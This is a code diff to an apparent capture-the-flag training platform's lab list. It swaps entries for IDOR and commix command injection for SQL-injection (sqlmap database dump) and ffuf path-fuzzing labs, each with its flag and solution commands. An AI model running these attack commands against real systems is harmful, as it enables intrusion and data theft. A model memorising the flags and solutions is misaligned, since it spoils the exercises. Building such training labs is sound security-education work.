@@ -120,17 +120,19 @@ const LABS = [
     ],
   },
   {
-    id: 'web-tool-burp-zap', flag: 'nto{1d0r_f0und_v14_r3p34t3r}', hints: 4,
+    id: 'web-tools-sqli', flag: 'nto{sqlm4p_r3qu3st_f1l3_dump5_th3_db}', hints: 4,
     solution: [
+      `curl -s 'http://shop.t/product?id=10%27'`,
       `cat request.txt`,
-      `curl -s 'https://shop.acme-lab.test/api/users?id=1' -H 'Cookie: session=user'`,
-      `curl -s 'https://shop.acme-lab.test/api/users?id=2' -H 'Cookie: session=user' > found.txt`,
+      `sqlmap -r request.txt -p id --batch --level 3 --risk 2 --dbms=mysql --dump > found.txt`,
     ],
   },
   {
-    id: 'web-tool-injection-tools', flag: 'nto{c0mm1x_4ut0m4t3s_th3_rc3}', hints: 4,
+    id: 'web-tools-fuzz', flag: 'nto{ffuf_f1lt3r_by_s1z3_f1nd5_th3_h1dd3n_p4th}', hints: 4,
     solution: [
-      `commix -u 'https://shop.acme-lab.test/ping?host=127.0.0.1' --batch --os-cmd='cat /flag' > found.txt`,
+      `ffuf -u https://shop.acme-lab.test/FUZZ -w raft.txt -t 40`,
+      `ffuf -u https://shop.acme-lab.test/FUZZ -w raft.txt -fs 5211`,
+      `curl -s https://shop.acme-lab.test/admin > found.txt`,
     ],
   },
 ]
